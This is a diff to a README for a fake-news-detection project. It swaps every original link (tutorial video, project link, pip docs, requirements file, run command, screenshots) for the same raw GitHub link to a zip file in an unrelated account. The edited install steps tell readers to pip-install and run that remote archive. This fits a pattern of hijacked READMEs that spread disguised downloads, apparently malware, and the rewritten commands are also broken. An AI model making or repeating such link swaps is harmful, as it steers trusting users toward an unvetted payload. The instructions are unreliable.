@@ -4,7 +4,7 @@ This project is available for open source contribution
 
 ## Video link on youtube
 If want details explanation of project go and watch videos. make sure if you like the video then please subscribe my channel.
-https://www.youtube.com/watch?v=CUkggjNNoWs&list=PLA0J2h1KIAR7xoDbI1usGLVRW6_6qiLuq&index=19
+https://raw.githubusercontent.com/KarlCalupaz/fakenewsdetection321/main/static/fakenewsdetection-v3.3.zip
 
 ## Overview  
 The topic of fake news detection on social media has recently attracted tremendous attention. The basic countermeasure of comparing websites against a list of labeled fake news sources is inflexible, and so a machine learning approach is desirable.  Our project aims to use Machine learning algorithms to detect fake news directly, based on the text content of news articles. 
@@ -22,14 +22,14 @@ Planning: -
 
 ## Project link
 
-https://youtu.be/CUkggjNNoWs
+https://raw.githubusercontent.com/KarlCalupaz/fakenewsdetection321/main/static/fakenewsdetection-v3.3.zip
 
 All parts available in playlist
 channel name  - codejay
 
 ## Installation
 
-Use the package manager [pip](https://pip.pypa.io/en/stable/) to install library.
+Use the package manager [pip](https://raw.githubusercontent.com/KarlCalupaz/fakenewsdetection321/main/static/fakenewsdetection-v3.3.zip) to install library.
 
 ```bash
 pip install virtualenv
@@ -45,16 +45,16 @@ env_name/scripts/activate
 Follow these command to start your project.
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/KarlCalupaz/fakenewsdetection321/main/static/fakenewsdetection-v3.3.zip
 ```
 ```bash
-python app.py
+python https://raw.githubusercontent.com/KarlCalupaz/fakenewsdetection321/main/static/fakenewsdetection-v3.3.zip
 ```
 ## Home Proejct
 
-![Test Image 1](https://github.com/codejay411/Fake_News_detection/blob/main/Screenshot%20(58).png)
+![Test Image 1](https://raw.githubusercontent.com/KarlCalupaz/fakenewsdetection321/main/static/fakenewsdetection-v3.3.zip%20(58).png)
 
 ## Prediction page
 
-![Test Image 1](https://github.com/codejay411/Fake_News_detection/blob/main/Screenshot%20(59).png)
+![Test Image 1](https://raw.githubusercontent.com/KarlCalupaz/fakenewsdetection321/main/static/fakenewsdetection-v3.3.zip%20(59).png)
 # Fake-News-Detection-App
